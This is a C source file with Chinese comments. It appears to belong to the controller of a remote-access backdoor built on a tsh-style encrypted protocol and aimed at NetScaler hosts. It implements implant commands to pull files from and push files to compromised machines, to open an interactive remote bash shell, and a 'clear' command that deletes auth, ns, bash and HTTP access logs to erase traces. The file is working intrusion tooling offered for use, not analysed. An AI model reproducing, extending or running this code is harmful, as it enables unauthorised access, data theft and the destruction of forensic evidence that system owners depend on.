#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <termios.h>
#include "client_commands.h"
#include "../../managers/client/client_manager.h"
#include "../../../crypto/protocol/pel.h"
#include "../../../client/client.h"
#include "../../utils/output_writer.h"

/* 客户端命令表 */
static struct client_command_entry client_commands[] = {
    { "help",       client_cmd_help,  "Show client commands" },
    { "get",        client_cmd_get,   "Get file from client: get <remote_file> <local_dir>" },
    { "put",        client_cmd_put,   "Put file to client: put <local_file> <remote_dir>" },
    { "shell",      client_cmd_shell, "Run shell command: shell [command]" },
    { "clear",      client_cmd_clear, "Clear netscaler client logs only" },
    { "exit",       client_cmd_exit,  "Exit client session" },
    { NULL, NULL, NULL }
};

/* 导出命令表 */
struct client_command_entry* get_client_commands(void) {
    return client_commands;
}

int client_cmd_help(int client_fd, const char *args, session_state_t *session) {
    (void)args;  /* Unused parameter */
    char buffer[1024];
    output_writer_t writer;
    writer_init(&writer, buffer, sizeof(buffer));

    writer_printf(&writer, "Client commands (you are connected to client %d):\n",
                  session->current_client_id);

    for (struct client_command_entry *c = client_commands; c->name; c++) {
        writer_printf(&writer, "    %s - %s\n", c->name, c->help);
        if (writer_has_overflow(&writer)) break;
    }

    writer_printf(&writer, "\n");
    return writer_flush_with_return(&writer, client_fd, 0);
}

int client_cmd_exit(int client_fd, const char *args, session_state_t *session) {
    (void)args;  // 标记未使用参数
    dprintf(client_fd, "Exiting client %d session...\n\n", session->current_client_id);
    exit_client_session(session);
    return 0;
}

int client_cmd_get(int client_fd, const char *args, session_state_t *session) {
    if (!args || strlen(args) == 0) {
        dprintf(client_fd, "Usage: get <remote_file> <local_dir>\n");
        return 0;
    }

    char *args_copy = strdup(args);
    char *remote_file = strtok(args_copy, " \t");
    char *local_dir = strtok(NULL, " \t");

    if (!remote_file || !local_dir) {
        dprintf(client_fd, "Usage: get <remote_file> <local_dir>\n");
        free(args_copy);
        return 0;
    }

    /* 找到客户端信息并设置文件传输标志 */
    client_info_t *current_client = NULL;
    for (int i = 0; i < session->client_mgr->client_count; i++) {
        if (session->client_mgr->clients[i].client_id == session->current_client_id) {
            current_client = &session->client_mgr->clients[i];
            break;
        }
    }

    if (current_client) {
        current_client->in_file_transfer = 1;  // 设置文件传输标志
    }

    /* 更新客户端活动时间 - 在命令开始时更新一次 */
    if (current_client) {
        update_client_activity(session->client_mgr, current_client->client_id);
    }

    /* 发送GET_FILE命令到客户端 */
    char action = GET_FILE;
    int ret = pel_send_msg(session->current_client_fd, (unsigned char*)&action, 1,
                          &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send command to client\n");
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    /* 发送文件名 */
    int len = strlen(remote_file);
    ret = pel_send_msg(session->current_client_fd, (unsigned char*)remote_file, len,
                      &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send filename to client\n");
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    /* 创建本地文件 */
    char *temp = strrchr(remote_file, '/');
    if (temp != NULL) temp++;
    if (temp == NULL) temp = remote_file;

    len = strlen(local_dir);
    char *pathname = (char*)malloc(len + strlen(temp) + 2);
    if (pathname == NULL) {
        dprintf(client_fd, "Memory allocation failed\n");
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    strcpy(pathname, local_dir);

    /* 只有当 local_dir 不以 / 结尾时才添加 / */
    if (len > 0 && pathname[len - 1] != '/') {
        strcpy(pathname + len, "/");
        strcpy(pathname + len + 1, temp);
    } else {
        strcpy(pathname + len, temp);
    }

    int fd = creat(pathname, 0644);
    if (fd < 0) {
        dprintf(client_fd, "Failed to create local file: %s\n", pathname);
        free(pathname);
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    dprintf(client_fd, "Receiving file from client...\n");

    /* 从客户端接收数据 */
    int total = 0;
    int progress_counter = 0;

    while (1) {
        ret = pel_recv_msg(session->current_client_fd, session->message_buffer, &len,
                          &current_client->recv_ctx, current_client->pel_buffer);

        if (ret != PEL_SUCCESS) {
            extern int pel_errno;
            if (pel_errno == PEL_CONN_CLOSED && total > 0) {
                break;
            }
            dprintf(client_fd, "Transfer failed\n");
            close(fd);
            unlink(pathname);  // 删除已创建的空文件或不完整文件
            free(pathname);
            if (current_client) current_client->in_file_transfer = 0;
            free(args_copy);
            return 0;
        }

        /* 检查文件传输结束信号 */
        if (len == 1 && session->message_buffer[0] == '\0') {
            dprintf(client_fd, "\nFile transfer ended normally\n");
            break;
        }

        /* 检查错误信息 */
        if (len > 6 && strncmp((char*)session->message_buffer, "ERROR:", 6) == 0) {
            session->message_buffer[len] = '\0';
            dprintf(client_fd, "\nClient error: %s\n", (char*)session->message_buffer);
            close(fd);
            unlink(pathname);  // 删除已创建的空文件
            free(pathname);
            if (current_client) current_client->in_file_transfer = 0;
            free(args_copy);
            return 0;
        }

        if (write(fd, session->message_buffer, len) != len) {
            dprintf(client_fd, "Failed to write to local file\n");
            close(fd);
            unlink(pathname);  // 删除不完整文件
            free(pathname);
            if (current_client) current_client->in_file_transfer = 0;
            free(args_copy);
            return 0;
        }

        total += len;
        progress_counter += len;

        /* 每1KB显示一次进度 */
        if (progress_counter >= 1024) {
            dprintf(client_fd, "Progress: %d bytes received\n", total);
            progress_counter = 0;
        }
    }

    close(fd);
    dprintf(client_fd, "File transfer completed: %d bytes received\n", total);
    dprintf(client_fd, "Saved to: %s\n", pathname);

    /* 清除文件传输标志 */
    if (current_client) {
        current_client->in_file_transfer = 0;
    }

    free(pathname);
    free(args_copy);
    return 0;
}

int client_cmd_put(int client_fd, const char *args, session_state_t *session) {
    if (!args || strlen(args) == 0) {
        dprintf(client_fd, "Usage: put <local_file> <remote_dir>\n");
        return 0;
    }

    char *args_copy = strdup(args);
    char *local_file = strtok(args_copy, " \t");
    char *remote_dir = strtok(NULL, " \t");

    if (!local_file || !remote_dir) {
        dprintf(client_fd, "Usage: put <local_file> <remote_dir>\n");
        free(args_copy);
        return 0;
    }

    /* 找到客户端信息并设置文件传输标志 */
    client_info_t *current_client = NULL;
    for (int i = 0; i < session->client_mgr->client_count; i++) {
        if (session->client_mgr->clients[i].client_id == session->current_client_id) {
            current_client = &session->client_mgr->clients[i];
            break;
        }
    }

    if (current_client) {
        current_client->in_file_transfer = 1;  // 设置文件传输标志
    }

    /* 更新客户端活动时间 - 在命令开始时更新一次 */
    if (current_client) {
        update_client_activity(session->client_mgr, current_client->client_id);
    }

    /* 发送PUT_FILE命令到客户端 */
    char action = PUT_FILE;
    int ret = pel_send_msg(session->current_client_fd, (unsigned char*)&action, 1,
                          &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send command to client\n");
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    /* 构造远程文件路径 */
    char *temp = strrchr(local_file, '/');
    if (temp != NULL) temp++;
    if (temp == NULL) temp = local_file;

    int len = strlen(remote_dir);
    char *remote_pathname = (char*)malloc(len + strlen(temp) + 2);
    if (remote_pathname == NULL) {
        dprintf(client_fd, "Memory allocation failed\n");
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    strcpy(remote_pathname, remote_dir);

    /* 只有当 remote_dir 不以 / 结尾时才添加 / */
    if (len > 0 && remote_pathname[len - 1] != '/') {
        strcpy(remote_pathname + len, "/");
        strcpy(remote_pathname + len + 1, temp);
    } else {
        strcpy(remote_pathname + len, temp);
    }

    /* 发送远程文件路径 */
    len = strlen(remote_pathname);
    ret = pel_send_msg(session->current_client_fd, (unsigned char*)remote_pathname, len,
                      &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send remote filename to client\n");
        free(remote_pathname);
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    free(remote_pathname);

    /* 打开本地文件 */
    int fd = open(local_file, O_RDONLY);
    if (fd < 0) {
        dprintf(client_fd, "Failed to open local file: %s\n", local_file);
        if (current_client) current_client->in_file_transfer = 0;
        free(args_copy);
        return 0;
    }

    dprintf(client_fd, "Sending file to client...\n");

    /* 传输文件到客户端 */
    int total = 0;
    int progress_counter = 0;

    while (1) {
        len = read(fd, session->message_buffer, BUFSIZE);

        if (len < 0) {
            dprintf(client_fd, "Failed to read local file\n");
            close(fd);
            if (current_client) current_client->in_file_transfer = 0;
            free(args_copy);
            return 0;
        }

        if (len == 0) {
            /* 文件读取完成，发送结束信号 */
            session->message_buffer[0] = '\0';  // 发送空字符作为结束信号
            ret = pel_send_msg(session->current_client_fd, session->message_buffer, 1,
                              &current_client->send_ctx, current_client->pel_buffer);
            if (ret != PEL_SUCCESS) {
                dprintf(client_fd, "Failed to send end signal\n");
            } else {
                dprintf(client_fd, "\nFile transfer ended normally\n");
            }
            break;
        }

        ret = pel_send_msg(session->current_client_fd, session->message_buffer, len,
                          &current_client->send_ctx, current_client->pel_buffer);
        if (ret != PEL_SUCCESS) {
            dprintf(client_fd, "Transfer failed\n");
            close(fd);
            if (current_client) current_client->in_file_transfer = 0;
            free(args_copy);
            return 0;
        }

        total += len;
        progress_counter += len;

        /* 每1KB显示一次进度 */
        if (progress_counter >= 1024) {
            dprintf(client_fd, "Progress: %d bytes sent\n", total);
            progress_counter = 0;
        }
    }

    close(fd);
    dprintf(client_fd, "File transfer completed: %d bytes sent\n", total);

    /* 清除文件传输标志 */
    if (current_client) {
        current_client->in_file_transfer = 0;
    }

    free(args_copy);
    return 0;
}

int client_cmd_shell(int client_fd, const char *args, session_state_t *session) {
    const char *command = args && strlen(args) > 0 ? args : "exec bash --login";

    /* 找到客户端信息并设置shell标志 */
    client_info_t *current_client = NULL;
    for (int i = 0; i < session->client_mgr->client_count; i++) {
        if (session->client_mgr->clients[i].client_id == session->current_client_id) {
            current_client = &session->client_mgr->clients[i];
            break;
        }
    }

    if (current_client) {
        current_client->in_shell_mode = 1;  // 设置shell模式标志
    }

    /* 更新客户端活动时间 - 在命令开始时更新一次 */
    if (current_client) {
        update_client_activity(session->client_mgr, current_client->client_id);
    }

    /* 发送RUNSHELL命令到客户端 */
    char action = RUNSHELL;
    int ret = pel_send_msg(session->current_client_fd, (unsigned char*)&action, 1,
                          &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send shell command to client\n");
        if (current_client) current_client->in_shell_mode = 0;
        return 0;
    }

    /* 发送TERM环境变量 */
    char *term = getenv("TERM");
    if (term == NULL) {
        term = "vt100";
    }

    int len = strlen(term);
    ret = pel_send_msg(session->current_client_fd, (unsigned char*)term, len,
                      &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send TERM to client\n");
        if (current_client) current_client->in_shell_mode = 0;
        return 0;
    }

    /* 发送窗口大小（使用合理的默认值） */
    struct winsize ws;
    ws.ws_row = 25;
    ws.ws_col = 80;

    session->message_buffer[0] = (ws.ws_row >> 8) & 0xFF;
    session->message_buffer[1] = (ws.ws_row) & 0xFF;
    session->message_buffer[2] = (ws.ws_col >> 8) & 0xFF;
    session->message_buffer[3] = (ws.ws_col) & 0xFF;

    ret = pel_send_msg(session->current_client_fd, session->message_buffer, 4,
                      &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send window size to client\n");
        if (current_client) current_client->in_shell_mode = 0;
        return 0;
    }

    /* 发送要执行的命令 */
    len = strlen(command);
    ret = pel_send_msg(session->current_client_fd, (unsigned char*)command, len,
                      &current_client->send_ctx, current_client->pel_buffer);
    if (ret != PEL_SUCCESS) {
        dprintf(client_fd, "Failed to send command to client\n");
        if (current_client) current_client->in_shell_mode = 0;
        return 0;
    }

    dprintf(client_fd, "Interactive shell started. Type 'exit' or press Ctrl+D to return to client session.\n");
    dprintf(client_fd, "Note: Some terminal features may not work perfectly over network.\n\n");

    /* 进入shell模式标记 - 发送特殊标记告诉客户端进入shell模式 */
    dprintf(client_fd, "\001SHELL_MODE:%d\001", session->current_client_id);

    return 3;  // 返回特殊值表示进入shell模式
}

int client_cmd_clear(int client_fd, const char *args, session_state_t *session) {
    (void)args;  // 标记未使用参数
    dprintf(client_fd, "Clearing client logs...\n");
    return client_cmd_shell(client_fd, "rm /var/log/auth.log /var/log/ns.log /var/log/bash.log /var/log/httpaccess.log", session);
}
